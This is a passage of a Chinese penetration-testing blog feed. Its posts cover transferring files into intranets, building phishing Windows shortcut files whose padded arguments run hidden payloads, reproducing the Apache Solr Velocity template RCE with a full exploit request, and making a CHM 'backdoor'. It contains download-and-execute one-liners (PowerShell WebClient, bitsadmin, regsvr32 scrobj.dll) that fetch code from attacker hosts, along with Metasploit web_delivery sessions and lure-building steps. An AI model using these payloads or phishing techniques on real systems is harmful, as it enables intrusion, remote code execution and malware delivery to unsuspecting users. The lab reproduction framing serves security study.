D:\\tomcat8.5\\webapps\\x.ps1</span><br></pre></td></tr></table></figure><p>保存脚本后再下载指定文件</p><p>该命令适用于server 2003以上版本</p><h2 id="Linux"><a href="#Linux" class="headerlink" title="Linux"></a>Linux</h2><h3 id="0x00-curl"><a href="#0x00-curl" class="headerlink" title="0x00 curl"></a>0x00 curl</h3><p><strong>基本用法</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"># curl http:&#x2F;&#x2F;www.linux.com</span><br></pre></td></tr></table></figure><p>执行后，<a href="http://www.linux.com" target="_blank" rel="noopener">www.linux.com</a> 的html就会显示在屏幕上了</p><p>保存访问的网页</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"># curl http:&#x2F;&#x2F;www.linux.com &gt;&gt; linux.html</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"># curl -o linux.html http:&#x2F;&#x2F;www.linux.com</span><br></pre></td></tr></table></figure><h3 id="0x01-wget"><a href="#0x01-wget" class="headerlink" title="0x01 wget"></a>0x01 wget</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"># wget -p &#x2F;etc http:&#x2F;&#x2F;192.168.72.10&#x2F;shell.php</span><br></pre></td></tr></table></figure><p>下载文件到 /etc 文件夹下</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;文件下载&quot;&gt;&lt;a href=&quot;#文件下载&quot; class=&quot;headerlink&quot; title=&quot;文件下载&quot;&gt;&lt;/a&gt;文件下载&lt;/h1&gt;&lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h
      
    
    </summary>
    
    
    
  </entry>
  
  <entry>
    <title>内网文件下载传输</title>
    <link href="http://mysecroad.github.io/posts/31532.html"/>
    <id>http://mysecroad.github.io/posts/31532.html</id>
    <published>2019-11-17T03:21:56.000Z</published>
    <updated>2020-04-26T09:24:33.154Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Windows"><a href="#Windows" class="headerlink" title="Windows"></a>Windows</h1><h2 id="0x00-FTP"><a href="#0x00-FTP" class="headerlink" title="0x00 FTP"></a>0x00 FTP</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">echo open 192.168.72.14 21 &gt;&gt; 1.txt         &#x2F;&#x2F;登陆FTP服务器</span><br><span class="line">echo test&gt;&gt;1.txt                              &#x2F;&#x2F;用户名</span><br><span class="line">echo 111111&gt;&gt;1.txt                              &#x2F;&#x2F;密码</span><br><span class="line">echo bin&gt;&gt;1.txt                              &#x2F;&#x2F;开始</span><br><span class="line">echo get fw.sh&gt;&gt;1.txt                      &#x2F;&#x2F;下载程序</span><br><span class="line">echo bye&gt;&gt;1.txt                              &#x2F;&#x2F;关闭FTP服务器</span><br><span class="line">输入上面命令后，在远程计算机上就会生成一个1.txt文件，执行命名：</span><br><span class="line">ftp -s:1.txt                        &#x2F;&#x2F;以1.txt中的内容执行ftp命令</span><br></pre></td></tr></table></figure><p><img src="/posts/31532/1.png" alt></p><h2 id="0x01-VBS脚本文件下载"><a href="#0x01-VBS脚本文件下载" class="headerlink" title="0x01 VBS脚本文件下载"></a>0x01 VBS脚本文件下载</h2><p>test.vbs脚本：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">echo Set xPost&#x3D;createObject(&quot;Microsoft.XMLHTTP&quot;) &gt;&gt;test.vbs</span><br><span class="line">echo xPost.Open &quot;GET&quot;,&quot;http:&#x2F;&#x2F;192.168.72.14&#x2F;1.bat&quot;,0  &gt;&gt;test.vbs</span><br><span class="line">echo xPost.Send() &gt;&gt;test.vbs</span><br><span class="line">echo set sGet&#x3D;createObject(&quot;ADODB.Stream&quot;) &gt;&gt;test.vbs</span><br><span class="line">echo sGet.Mode&#x3D;3 &gt;&gt;test.vbs</span><br><span class="line">echo sGet.Type&#x3D;1 &gt;&gt;test.vbs</span><br><span class="line">echo sGet.Open() &gt;&gt;test.vbs</span><br><span class="line">echo sGet.Write xPost.ResponseBody &gt;&gt;test.vbs</span><br><span class="line">echo sGet.SaveToFile &quot;c:\file.zip&quot;,2 &gt;&gt;test.vbs</span><br></pre></td></tr></table></figure><p>这样会在当前目录生成test.vbs<br>然后执行：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cscript test.vbs</span><br></pre></td></tr></table></figure><p><img src="/posts/31532/2.png" alt></p><h2 id="0x02-Powershel"><a href="#0x02-Powershel" class="headerlink" title="0x02 Powershel"></a>0x02 Powershel</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powershell -ExecutionPolicy Bypass -File .\test.ps1</span><br></pre></td></tr></table></figure><p>test.ps1内容：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$d &#x3D; New-Object System.Net.WebClient</span><br><span class="line">$d.DownloadFile(&quot;http:&#x2F;&#x2F;192.168.72.14&#x2F;1.bat&quot;,&quot;1.bat&quot;)</span><br></pre></td></tr></table></figure><p><img src="/posts/31532/3.png" alt></p><h2 id="0x03-bitsadmin"><a href="#0x03-bitsadmin" class="headerlink" title="0x03 bitsadmin"></a>0x03 bitsadmin</h2><p>第一种</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bitsadmin &#x2F;transfer n http:&#x2F;&#x2F;192.168.72.13&#x2F;1.bat c:\new\1.bat</span><br></pre></td></tr></table></figure><p>第二种</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bitsadmin &#x2F;rawreturn &#x2F;transfer getfile http:&#x2F;&#x2F;192.168.72.13&#x2F;1.bat c:\new\1.bat</span><br></pre></td></tr></table></figure><p>第三种</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bitsadmin &#x2F;rawreturn &#x2F;transfer getpayload http:&#x2F;&#x2F;192.168.72.13&#x2F;1.bat c:\new\1.bat</span><br></pre></td></tr></table></figure><p>第四种</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bitsadmin &#x2F;transfer aa http:&#x2F;&#x2F;192.168.72.13&#x2F;1.bat c:\new\1.bat</span><br></pre></td></tr></table></figure><p>第五种</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">bitsadmin &#x2F;create aa</span><br><span class="line"></span><br><span class="line">bitsadmin &#x2F;addfile qianxiao996 http:&#x2F;&#x2F;192.168.72.13&#x2F;1.bat c:\new\1.bat</span><br><span class="line"></span><br><span class="line">bitsadmin &#x2F;resume aa</span><br><span class="line"></span><br><span class="line">bitsadmin &#x2F;info aa &#x2F;verbose</span><br><span class="line"></span><br><span class="line">bitsadmin &#x2F;complete aa</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;Windows&quot;&gt;&lt;a href=&quot;#Windows&quot; class=&quot;headerlink&quot; title=&quot;Windows&quot;&gt;&lt;/a&gt;Windows&lt;/h1&gt;&lt;h2 id=&quot;0x00-FTP&quot;&gt;&lt;a href=&quot;#0x00-FTP&quot; class=&quot;headerli
      
    
    </summary>
    
    
    
      <category term="内网渗透" scheme="http://mysecroad.github.io/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"/>
    
  </entry>
  
  <entry>
    <title>构造windows快捷方式钓鱼信</title>
    <link href="http://mysecroad.github.io/posts/44104.html"/>
    <id>http://mysecroad.github.io/posts/44104.html</id>
    <published>2019-11-09T06:22:36.000Z</published>
    <updated>2020-04-26T13:38:23.771Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>关于windows快捷方式,想必这里就不用再多说了,大家应该已经非常了解才是,说白点,它其实就是一种路径映射而已,而我们利用的也正是这种特性,触发细节很简单,这里不妨简单回顾下,当我们双击打开一个windows快捷方式时内部到底都发生了些什么,首先,windows会根据快捷方式中指定的路径去触发执行相应的程序,假如我们指向的是一个包含恶意的payload路径,那结果就可想而知,payload肯定会被正常执行</p><h2 id="0x01-生成快捷方式"><a href="#0x01-生成快捷方式" class="headerlink" title="0x01 生成快捷方式"></a>0x01 生成快捷方式</h2><p>新建 test.txt 文件，内容如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cmd &#x2F;c calc</span><br></pre></td></tr></table></figure><p>新建 test.ps1 文件，右键powershell运行</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$file &#x3D; Get-Content &quot;test.txt&quot;</span><br><span class="line">$WshShell &#x3D; New-Object -comObject WScript.Shell</span><br><span class="line">$Shortcut &#x3D; $WshShell.CreateShortcut(&quot;test.lnk&quot;)</span><br><span class="line">$Shortcut.TargetPath &#x3D; &quot;%SystemRoot%\system32\cmd.exe&quot;</span><br><span class="line">$Shortcut.IconLocation &#x3D; &quot;%SystemRoot%\System32\Shell32.dll,21&quot;</span><br><span class="line">$Shortcut.Arguments &#x3D; &#39;                                                                                                                                                                                                                                    &#39;+ $file</span><br><span class="line">$Shortcut.Save()</span><br></pre></td></tr></table></figure><p>生成 test.lnk 文件，而且图标改了（powershell执行文件要和test.txt要在一个目录下，这个图标所在位置就在%SystemRoot%\System32\Shell32.dll目录下）</p><p>双击 test.lnk ，调用计算器<br><img src="/posts/44104/1.png" alt></p><h2 id="0x02-借助windows快捷方式实现beacon上线"><a href="#0x02-借助windows快捷方式实现beacon上线" class="headerlink" title="0x02 借助windows快捷方式实现beacon上线"></a>0x02 借助windows快捷方式实现beacon上线</h2><p>先创建一个powershell的payload</p><p>Attacks –&gt; Packages –&gt; payload Generator<br><img src="/posts/44104/2.png" alt></p><p>将生成的代码替换掉 calc，运行 test.ps1，生成 test.lnk<br>双击 test.lnk，反弹shell<br><img src="/posts/44104/3.png" alt></p><h2 id="0x02-借助windows快捷方式实现meterpreter上线"><a href="#0x02-借助windows快捷方式实现meterpreter上线" class="headerlink" title="0x02 借助windows快捷方式实现meterpreter上线"></a>0x02 借助windows快捷方式实现meterpreter上线</h2><p>先用msf去生成payload</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">msf &gt; use exploit&#x2F;multi&#x2F;script&#x2F;web_delivery </span><br><span class="line">msf &gt; set target  3</span><br><span class="line">msf &gt; set payload windows&#x2F;meterpreter&#x2F;reverse_tcp_rc4_dns </span><br><span class="line">msf &gt; set lhost 192.168.3.29</span><br><span class="line">msf &gt; set lport 82</span><br><span class="line">msf &gt; set rc4password  klionsec</span><br><span class="line">msf exploit(multi&#x2F;script&#x2F;web_delivery) &gt; exploit -j</span><br><span class="line">[*] Exploit running as background job 0.</span><br><span class="line"></span><br><span class="line">[*] Started reverse TCP handler on 192.168.3.29:82 </span><br><span class="line">msf exploit(multi&#x2F;script&#x2F;web_delivery) &gt; [*] Using URL: http:&#x2F;&#x2F;0.0.0.0:8080&#x2F;qQJvcDScrbA</span><br><span class="line">[*] Local IP: http:&#x2F;&#x2F;192.168.3.29:8080&#x2F;qQJvcDScrbA</span><br><span class="line">[*] Server started.</span><br><span class="line">[*] Run the following command on the target machine:</span><br><span class="line">regsvr32 &#x2F;s &#x2F;n &#x2F;u &#x2F;i:http:&#x2F;&#x2F;192.168.3.29:8080&#x2F;qQJvcDScrbA.sct scrobj.dll将此命令单独写到meter.txt文件中去生成快捷方式</span><br></pre></td></tr></table></figure><p>生成快捷方式，双击执行</p><h2 id="0x03-借助windows快捷方式实现自定义木马上线"><a href="#0x03-借助windows快捷方式实现自定义木马上线" class="headerlink" title="0x03 借助windows快捷方式实现自定义木马上线"></a>0x03 借助windows快捷方式实现自定义木马上线</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powershell.exe (New-Object System.Net.WebClient).DownloadFile(&#39;http:&#x2F;&#x2F;192.168.72.23&#x2F;&#x2F;PsExec.exe&#39;,&#39;c:\\temp\\PsExec.exe&#39;);(New-Object -com Shell.Application).ShellExecute(&#39;c:\\temp\\PsExec.exe&#39;)</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;0x00-前言&quot;&gt;&lt;a href=&quot;#0x00-前言&quot; class=&quot;headerlink&quot; title=&quot;0x00 前言&quot;&gt;&lt;/a&gt;0x00 前言&lt;/h2&gt;&lt;p&gt;关于windows快捷方式,想必这里就不用再多说了,大家应该已经非常了解才是,说白点,它其实就是一种
      
    
    </summary>
    
    
    
  </entry>
  
  <entry>
    <title>Apache Solr Velocity Template RCE漏洞复现</title>
    <link href="http://mysecroad.github.io/posts/57536.html"/>
    <id>http://mysecroad.github.io/posts/57536.html</id>
    <published>2019-11-06T10:53:57.000Z</published>
    <updated>2020-04-26T09:24:33.101Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x00-Apache-Solr介绍"><a href="#0x00-Apache-Solr介绍" class="headerlink" title="0x00 Apache Solr介绍"></a>0x00 Apache Solr介绍</h2><p>Solr是一个独立的企业级搜索应用服务器，它对外提供类似于Web-service的API接口。用户可以通过http请求，向搜索引擎服务器提交一定格式的XML文件，生成索引；也可以通过Http Get操作提出查找请求，并得到XML格式的返回结果。</p><h2 id="0x01-漏洞描述"><a href="#0x01-漏洞描述" class="headerlink" title="0x01 漏洞描述"></a>0x01 漏洞描述</h2><p>Solr中存在VelocityResponseWriter组件,攻击者可以构造特定请求修改相关配置,使VelocityResponseWriter组件允许加载指定模板,进而导致Velocity模版注入远程命令执行漏洞，攻击者利用该漏洞可以直接获取到服务器权限。</p><p>漏洞产生原因:</p><p>当攻击者可以直接访问Solr控制台时，可以通过发送类似/节点名/config的POST请求对该节点的配置文件做更改Apache Solr默认集成VelocityResponseWriter插件，在该插件的初始化参数中的params.resource.loader.enabled这个选项是用来控制是否允许参数资源加载器在Solr请求参数中指定模板，默认设置是false。当设置params.resource.loader.enabled为ture时，将允许用户通过设置请求中的参数来指定相关资源加载，这也就意味着攻击者可以通过构造一个具有威胁的攻击请求，在服务器上进行命令执行。</p><h2 id="0x02-漏洞影响版本"><a href="#0x02-漏洞影响版本" class="headerlink" title="0x02 漏洞影响版本"></a>0x02 漏洞影响版本</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Apache Solr 5.x -- 8.2.0，存在config API版本</span><br></pre></td></tr></table></figure><h2 id="0x03-漏洞环境搭建"><a href="#0x03-漏洞环境搭建" class="headerlink" title="0x03 漏洞环境搭建"></a>0x03 漏洞环境搭建</h2><p><strong>启动vulhub环境：</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">cd &#x2F;vulhub&#x2F;solr&#x2F;CVE-2019-0193-RCE</span><br><span class="line"></span><br><span class="line">docker-compose build</span><br><span class="line"></span><br><span class="line">docker-compose up -d</span><br></pre></td></tr></table></figure><p>创建一个名为test的Core:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo docker-compose exec solr bash bin&#x2F;solr create_core -c test -d example&#x2F;example-DIH&#x2F;solr&#x2F;db</span><br></pre></td></tr></table></figure><p>访问<a href="http://ip:8983，当前solr版本为8.1.1">http://ip:8983，当前solr版本为8.1.1</a><br>![](Apache Solr Velocity Template RCE漏洞复现/1.png)</p><h2 id="0x04-漏洞利用"><a href="#0x04-漏洞利用" class="headerlink" title="0x04 漏洞利用"></a>0x04 漏洞利用</h2><p>漏洞利用前提：攻击者需要知道Solr服务中Core的名称才能执行攻击</p><p>如下图所示，Core的名称为test</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;192.168.72.14:8983&#x2F;solr&#x2F;#&#x2F;~cores&#x2F;test</span><br></pre></td></tr></table></figure><p>![](Apache Solr Velocity Template RCE漏洞复现/2.png)</p><p>访问：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;192.168.72.14:8983&#x2F;solr&#x2F;test&#x2F;config</span><br></pre></td></tr></table></figure><p>抓包修改GET请求为POST,POST内容如下（修改Core的配置）<br>![](Apache Solr Velocity Template RCE漏洞复现/3.png)<br>利用公开的EXP测试：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;select?q&#x3D;1&amp;&amp;wt&#x3D;velocity&amp;v.template&#x3D;custom&amp;v.template.custom&#x3D;%23set($x&#x3D;%27%27)+%23set($rt&#x3D;$x.class.forName(%27java.lang.Runtime%27))+%23set($chr&#x3D;$x.class.forName(%27java.lang.Character%27))+%23set($str&#x3D;$x.class.forName(%27java.lang.String%27))+%23set($ex&#x3D;$rt.getRuntime().exec(%27id%27))+$ex.waitFor()+%23set($out&#x3D;$ex.getInputStream())+%23foreach($i+in+[1..$out.available()])$str.valueOf($chr.toChars($out.read()))%23end</span><br></pre></td></tr></table></figure><p>![](Apache Solr Velocity Template RCE漏洞复现/4.png)</p><p>查看ls<br>![](Apache Solr Velocity Template RCE漏洞复现/5.png)</p><h2 id="0x05-参考链接"><a href="#0x05-参考链接" class="headerlink" title="0x05 参考链接"></a>0x05 参考链接</h2><p><a href="https://github.com/vulhub/vulhub/tree/master/solr/CVE-2019-0193" target="_blank" rel="noopener">https://github.com/vulhub/vulhub/tree/master/solr/CVE-2019-0193</a></p><p><a href="https://github.com/veracode-research/solr-injection#7-cve-2019-xxxx-rce-via-velocity-template-by-_s00py" target="_blank" rel="noopener">https://github.com/veracode-research/solr-injection#7-cve-2019-xxxx-rce-via-velocity-template-by-_s00py</a></p><p><a href="https://gist.githubusercontent.com/s00py/a1ba36a3689fa13759ff910e179fc133/raw/fae5e663ffac0e3996fd9dbb89438310719d347a/gistfile1.txt" target="_blank" rel="noopener">https://gist.githubusercontent.com/s00py/a1ba36a3689fa13759ff910e179fc133/raw/fae5e663ffac0e3996fd9dbb89438310719d347a/gistfile1.txt</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;0x00-Apache-Solr介绍&quot;&gt;&lt;a href=&quot;#0x00-Apache-Solr介绍&quot; class=&quot;headerlink&quot; title=&quot;0x00 Apache Solr介绍&quot;&gt;&lt;/a&gt;0x00 Apache Solr介绍&lt;/h2&gt;&lt;p&gt;Solr是一
      
    
    </summary>
    
    
      <category term="漏洞复现" scheme="http://mysecroad.github.io/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    
    
      <category term="漏洞复现" scheme="http://mysecroad.github.io/tags/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    
  </entry>
  
  <entry>
    <title>构造无痕CHM后门</title>
    <link href="http://mysecroad.github.io/posts/13577.html"/>
    <id>http://mysecroad.github.io/posts/13577.html</id>
    <published>2019-10-29T08:36:55.000Z</published>
    <updated>2020-04-26T09:24:33.180Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x00-chm-是什么"><a href="#0x00-chm-是什么" class="headerlink" title="0x00 chm 是什么"></a>0x00 chm 是什么</h2><p>CHM [Compiled Help Manual],即”已编译的帮助文件”,它是微软新一代帮助文件格式,利用HTML作源文,把帮助内容以类似数据库的形式进行编译储存,以.CHM后缀结尾,支持Javascript,VBscript,ActiveX,Java Applet,Flash,以及常见图形文件(GIF,JPEG,PNG),音频视频文件(MID,WAV,AVI)等…,也就是说,我们可以直接利用chm去肆意地访问各类网络资源,另外,因其使用方便,形式多样,通常也多被采用作为电子书的默认格式。</p><h2 id="0x01-chm-制作"><a href="#0x01-chm-制作" class="headerlink" title="0x01 chm 制作"></a>0x01 chm 制作</h2><p>新建一个文件夹，里面有一个test.html，内容随意<br><img src="/posts/13577/1.png" alt></p><p>打开EasyCHM，新建-&gt;浏览。选择该目录。默认文件类型<br><img src="/posts/13577/2.png" alt></p><p>点击确认，即可看到预览的CHM文件<br><img src="/posts/13577/3.png" alt></p><p>选择文件—编译，即可编译成CHM文件。</p><p><strong>举个例子</strong></p><p>弹出计算器</p><p>test.html 的内容为:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE HTML&gt;</span><br><span class="line">&lt;HTML&gt;</span><br><span class="line">&lt;HEAD&gt;</span><br><span class="line">&lt;META HTTP-EQUIV&#x3D;&quot;Content-Type&quot; Content&#x3D;&quot;text&#x2F;html; charset&#x3D;utf-8&quot;&gt;</span><br><span class="line"></span><br><span class="line">&lt;TITLE&gt;test&lt;&#x2F;TITLE&gt;</span><br><span class="line">&lt;&#x2F;HEAD&gt;</span><br><span class="line"></span><br><span class="line">&lt;BODY BGCOLOR&#x3D;&quot;#FFFFFF&quot; TEXT&#x3D;&quot;#000000&quot;&gt;</span><br><span class="line">&lt;OBJECT id&#x3D;autoloader classid&#x3D;&quot;clsid:adb880a6-d8ff-11cf-9377-00aa003b7a11&quot; width&#x3D;1 height&#x3D;1&gt;</span><br><span class="line">&lt;PARAM name&#x3D;&quot;Command&quot; value&#x3D;&quot;ShortCut&quot;&gt;</span><br><span class="line">&lt;PARAM name&#x3D;&quot;Button&quot; value&#x3D;&quot;Bitmap::shortcut&quot;&gt;</span><br><span class="line">&lt;PARAM name&#x3D;&quot;Item1&quot; value&#x3D;&quot;,calc.exe,&quot;&gt;</span><br><span class="line">&lt;PARAM name&#x3D;&quot;Item2&quot; value&#x3D;&quot;273,1,1&quot;&gt;</span><br><span class="line">&lt;&#x2F;OBJECT&gt;</span><br><span class="line">&lt;SCRIPT&gt;</span><br><span class="line">autoloader.Click();</span><br><span class="line">&lt;&#x2F;SCRIPT&gt;</span><br><span class="line"></span><br><span class="line">&lt;p&gt;Just a test!&lt;&#x2F;p&gt;</span><br><span class="line">&lt;&#x2F;BODY&gt;</span><br><span class="line">&lt;&#x2F;HTML&gt;</span><br></pre></td></tr></table></figure><p><code>&lt;OBJECT&gt;</code> 和 <code>&lt;SCRIPT&gt;</code> 为核心代码，只需将这段代码插入任意html中即可。</p><p>按照上述过程制作test.chm文件<br>双击生成的.chm文件<br><img src="/posts/13577/4.png" alt></p><h2 id="0x02-借助chm实现meterpreter上线"><a href="#0x02-借助chm实现meterpreter上线" class="headerlink" title="0x02 借助chm实现meterpreter上线"></a>0x02 借助chm实现meterpreter上线</h2><p>既然现在都能弹计算器了,很明显,弹个meterpreter又会有多难呢,首先,先把msf起起来准备好相应的payload,如下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">msf5 &gt; use exploit&#x2F;multi&#x2F;script&#x2F;web_delivery </span><br><span class="line">msf5 exploit(multi&#x2F;script&#x2F;web_delivery) &gt; set target 3</span><br><span class="line">target &#x3D;&gt; 3</span><br><span class="line">msf5 exploit(multi&#x2F;script&#x2F;web_delivery) &gt; set payload windows&#x2F;meterpreter&#x2F;reverse_tcp_uuid </span><br><span class="line">payload &#x3D;&gt; windows&#x2F;meterpreter&#x2F;reverse_tcp_uuid</span><br><span class="line">msf5 exploit(multi&#x2F;script&#x2F;web_delivery) &gt; set lhost 192.168.72.23</span><br><span class="line">lhost &#x3D;&gt; 192.168.72.23</span><br><span class="line">msf5 exploit(multi&#x2F;script&#x2F;web_delivery) &gt; set lport 5555</span><br><span class="line">lport &#x3D;&gt; 5555</span><br><span class="line">msf5 exploit(multi&#x2F;script&#x2F;web_delivery) &gt; set exitonsession false</span><br><span class="line">exitonsession &#x3D;&gt; false</span><br><span class="line">msf5 exploit(multi&#x2F;script&#x2F;web_delivery) &gt; exploit -j</span><br><span class="line">[*] Exploit running as background job 0.</span><br><span class="line">[*] Exploit completed, but no session was created.</span><br><span class="line"></span><br><span class="line">[*] Started reverse TCP handler on 192.168.72.23:5555 </span><br><span class="line">[*] Using URL: http:&#x2F;&#x2F;0.0.0.0:8080&#x2F;CSw0SdX2n23YH</span><br><span class="line">[*] Local IP: http:&#x2F;&#x2F;192.168.72.23:8080&#x2F;CSw0SdX2n23YH</span><br><span class="line">[*] Server started.</span><br><span class="line">[*] Run the following command on the target machine:</span><br><span class="line">regsvr32 &#x2F;s &#x2F;n &#x2F;u &#x2F;i:http:&#x2F;&#x2F;192.168.72.23:8080&#x2F;CSw0SdX2n23YH.sct scrobj.dll</span><br></pre></td></tr></table></figure><p>接着,只需要把弹计算器部分的命令替换成上面远程加载执行payload的命令即可,而后再重新编译为chm</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;OBJECT id&#x3D;autoloader classid&#x3D;&quot;clsid:adb880a6-d8ff-11cf-9377-00aa003b7a11&quot; width&#x3D;1 height&#x3D;1&gt;</span><br><span class="line">&lt;PARAM name&#x3D;&quot;Command&quot; value&#x3D;&quot;ShortCut&quot;&gt;</span><br><span class="line">&lt;PARAM name&#x3D;&quot;Button&quot; value&#x3D;&quot;Bitmap::shortcut&quot;&gt;</span><br><span class="line">&lt;PARAM name&#x3D;&quot;Item1&quot; value&#x3D;&quot;,regsvr32,&#x2F;s &#x2F;n &#x2F;u &#x2F;i:http:&#x2F;&#x2F;192.168.3.14:8080&#x2F;WzRAPJ4u2Pp2IAL.sct scrobj.dll&quot;&gt;</span><br><span class="line">&lt;PARAM name&#x3D;&quot;Item2&quot; value&#x3D;&quot;273,1,1&quot;&gt;</span><br><span class="line">&lt;&#x2F;OBJECT&gt;</span><br><span class="line">&lt;SCRIPT&gt;</span><br><span class="line">autoloader.Click();</span><br><span class="line">&lt;&#x2F;SCRIPT&gt;</span><br></pre></td></tr></table></figure><p>不过，在目标执行chm文件之后，却出现如下错误，目前尚未解决<br><img src="/posts/13577/7.png" alt></p><h2 id="0x03-利用chm实现自定义木马上线"><a href="#0x03-利用chm实现自定义木马上线" class="headerlink" title="0x03 利用chm实现自定义木马上线"></a>0x03 利用chm实现自定义木马上线</h2><p><strong>注意:</strong> 最好不要再直接用powershell或者cmd去远程执行下载,不然在打开chm时会飘黑框</p><p>为了能让chm在打开时不弹黑框,此处我们就用一种比较间接的方式,用hta来帮我们在前面挡一刀,即 用先在chm里执行hta,而hta里放的则是远程加载执行我们自己马的powershell代码,具体如下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"># &#x2F;etc&#x2F;init.d&#x2F;apache2 start</span><br><span class="line"># mv &#x2F;home&#x2F;test&#x2F;Desktop&#x2F;chmbackdoor.exe 